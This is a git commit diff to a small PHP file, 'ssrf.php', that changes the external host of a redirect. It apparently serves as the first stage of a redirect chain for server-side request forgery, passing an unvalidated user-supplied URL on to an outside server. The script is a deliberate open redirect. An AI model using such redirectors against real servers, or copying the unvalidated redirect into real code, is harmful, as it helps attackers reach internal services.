686e3fd07add5cf499695e6bb2a14d1d0f4942da
PJWaurora <854271190@qq.com>
2025-10-05 16:13:05 +0800

    Update ssrf.php

--- ssrf.php
+++ ssrf.php
@@ -1,5 +1,5 @@
 <?php
 // 第一层重定向
 $url = $_REQUEST['url'];
-header('Location: https://ssrf-pjwaurora0808.replit.app/final.php?path=' . urlencode($url));
+header('Location: https://ssrf-virid.vercel.app//final.php?path=' . urlencode($url));
 ?>
